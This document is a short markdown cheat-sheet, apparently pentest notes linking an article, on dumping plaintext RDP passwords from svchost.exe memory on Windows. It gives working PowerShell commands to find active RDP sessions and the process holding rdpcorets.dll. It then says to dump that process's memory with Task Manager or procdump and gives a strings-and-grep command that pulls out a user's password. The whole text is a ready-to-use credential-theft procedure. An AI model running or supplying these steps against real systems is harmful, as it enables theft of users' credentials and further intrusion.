# Dumping plaintext RDP credentials from svchost.exe
#RPD #Windows #post-exploitation  
[Article](https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/)

svchost.exe which loads RPDcorets.dll have the possiblity of holding RPD password in clear text, which can found using strings tool. 

## IRL usecase
The use this in IRL you need to have admin access to the machine. 

First identity if there is a RDP connection to the machine 

````powershell 
netstat -nob | select-String TermService -Context 1

    TCP    10.0.24.133:3389       10.2.25.11:51258       ESTABLISHED     468
>   TermService
   [svchost.exe]
    TCP    10.0.24.133:3389       10.2.25.12:52507       ESTABLISHED     468
>   TermService
   [svchost.exe]
````

Here we see there are two RDP connection, lets see if svchost.exe have loaded the RDPcorets.dll file. 

````powershell 
tasklist /m:rdpcorets.dll
Image Name                     PID Modules
========================= ======== ============================================
svchost.exe                    468 rdpcorets.dll
````

dump the memory of the file using either task manager or procdump.exe 

do a strings search on the memory file
````bash
strings -el svchost* | grep <username> -C3
````